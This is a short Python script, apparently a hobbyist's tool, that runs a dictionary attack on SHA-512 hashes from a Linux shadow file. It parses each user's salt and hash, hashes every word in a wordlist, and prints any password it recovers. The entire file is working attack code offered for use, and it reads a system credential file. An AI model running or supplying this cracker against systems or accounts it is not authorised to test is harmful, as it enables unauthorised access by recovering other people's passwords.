#!/usr/bin/python
# always wanted to write my own passwd cracker this uses the modern GNU/Linux
# sha512 hashing with salt, this may not be usefull when cracking in the real world
# but can be usefull if you dont have your tools with you and you just have python.
 
import crypt

def testPass(salt, cryptPass):
  dictFile = open('/home/rek2/dictionary.txt','r')

  for word in dictFile.readlines():
    word = word.strip('\n')
    output = crypt.crypt(word, '$6$%s$' % salt)
    dicPasswd = output.split('$')[-1]
    if (dicPasswd == cryptPass):
      print("[+] Password Found: "+word+"\n")
      return

def main():
  passFile = open('/home/rek2/shadow')

  for line in passFile.readlines():
    if ":" in line:
      user = line.split(':')[0]
      cryptPass = line.split(':')[1].strip(' ')
      salt = cryptPass.split('$')[-2]
      passwd = cryptPass.split('$')[-1]
      print("[*] Cracking Password For: "+user)
      testPass(salt, passwd)

if __name__ == "__main__":
  main()
